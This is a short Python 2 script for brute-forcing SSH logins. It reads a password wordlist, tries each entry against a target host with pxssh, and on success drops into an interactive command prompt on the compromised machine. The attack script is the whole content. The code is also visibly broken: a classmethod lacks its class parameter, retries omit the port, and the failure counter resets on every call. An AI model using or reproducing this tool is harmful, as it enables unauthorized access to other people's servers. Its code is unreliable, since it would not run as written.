from pexpect import pxssh
import argparse
import time

class PasswordGuessing(object):	
	
	@classmethod
	def connect(host, user, password, port):              #take host user and password
	    global Found
	    Fails = 0
	
	    try:
	        s = pxssh.pxssh()                       #s is ssh session
	        s.login(host, user, password, port)           #try to login
	        print 'Password Found: ' + password
	        return s
	
	    except Exception, e:
	        if Fails > 10000:
	            print "I chaecked 10,000 passwords"
	            exit(0)
	        elif 'read_nonblocking' in str(e):
	            Fails += 1
	            #time.sleep(5)
	            return connect(host, user, password)
	        elif 'synchronize with original prompt' in str(e):
	            #time.sleep(1)
	            return connect(host, user, password)
	        return None
	@classmethod
	def guessPassword(self,host, user, passwords, port):
	        
	        if host != "" and user != "" and passwords != "" and port != "":
	            with open(passwords, 'r') as infile:
	                for line in infile:
	                    password = line.strip('\r\n')
	                    print "Testing: " + str(password)
	                    con = connect(host, user, password, port)
	                    if con:
	                        print "[SSH connected, Issue commands (q or Q) To quit]"
	                        command = raw_input(">")
	                        while command != 'q' and command != 'Q':
	                            con.sendline(command)
	                            con.prompt()
	                            print con.before
	                            command = raw_input(">")
	        else:
	            #print parser.usage
	            exit(0)
